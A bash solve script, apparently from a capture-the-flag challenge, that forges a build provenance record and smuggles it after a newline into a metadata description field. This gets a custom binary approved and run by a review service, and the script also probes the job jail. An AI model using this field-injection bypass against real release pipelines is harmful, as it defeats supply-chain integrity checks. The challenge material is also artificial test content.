#!/usr/bin/env bash
# Stage two: bypass provenance with a custom executable that reads job stdin.
set -euo pipefail

TARGET=${TARGET:-http://localhost:8080}
binary=$(mktemp)
probe=$(mktemp)
trap 'rm -f "$binary" "$probe"' EXIT

gcc -nostdlib -static -no-pie -Os -s -Wl,--build-id=none \
  -o "$binary" solution/exec-payload.c
digest="sha256:$(sha256sum "$binary" | cut -d ' ' -f 1)"
fake=$(printf '{"digest":"%s","source":{"branch":"main"},"result":"passed"}' "$digest")
metadata=$(python3 -c \
  'import json,sys; print(json.dumps({"description":"Cache de Spectre: release candidate\n"+sys.argv[1]}))' \
  "$fake")
# A syscall outside the jail allowlist must not reveal the server's environment.
gcc -nostdlib -static -no-pie -Os -s -Wl,--build-id=none \
  -o "$probe" solution/probe-jail.c
probe_digest="sha256:$(sha256sum "$probe" | cut -d ' ' -f 1)"
probe_record=$(printf '{"digest":"%s","source":{"branch":"main"},"result":"passed"}' "$probe_digest")
probe_metadata=$(python3 -c \
  'import json,sys; print(json.dumps({"description":"Cache de Spectre: probe\n"+sys.argv[1]}))' \
  "$probe_record")
probe_result=$(curl -fsS -F "binary=@$probe" --form-string "metadata=$probe_metadata" "$TARGET/review")
probe_flags=$(grep -oE 'noco\{[^}]+\}' <<< "$probe_result" | wc -l)
[[ "$probe_result" == *'Job exited without completing.'* && "$probe_flags" -eq 1 ]] || {
  echo "solve-exec: jail allowed a forbidden file open" >&2; exit 1;
}

response=$(curl -fsS -F "binary=@$binary" --form-string "metadata=$metadata" "$TARGET/review")
[[ "$response" == *'Promotion approved'* && "$response" == *'Release job'* ]] || {
  echo "solve-exec: release job did not run" >&2; exit 1;
}
mapfile -t flags < <(grep -oE 'noco\{[^}]+\}' <<< "$response")
[[ ${#flags[@]} -eq 2 ]] || { echo "solve-exec: jail did not print its flag" >&2; exit 1; }
echo "${flags[1]}"
